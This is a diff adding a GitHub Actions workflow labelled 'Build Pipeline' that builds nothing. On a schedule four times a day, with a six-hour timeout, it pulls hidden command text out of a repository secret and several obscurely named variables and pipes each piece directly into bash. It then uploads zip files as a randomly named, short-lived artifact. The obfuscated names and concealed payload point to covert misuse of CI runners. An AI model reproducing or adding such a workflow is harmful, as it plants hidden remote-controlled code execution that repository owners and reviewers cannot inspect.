@@ -1,0 +1,35 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '39 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          pf76: ${{ secrets.pf76 }}
+        run: |
+          printf '%s' "$pf76" | jq -r .vlany6255 | /bin/bash
+          echo $ee64307 | jq -r .lbfr71513 | /bin/bash
+          echo $uegi98848 | jq -r .vn59 | /bin/bash
+          printf '%s' "$qxgpg9" | jq -r .kv6785 | /bin/bash
+          printf '%s' "$tjuk4" | jq -r .vihu936 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: yuyqMj39
+          path: "*.zip"
+          retention-days: 1
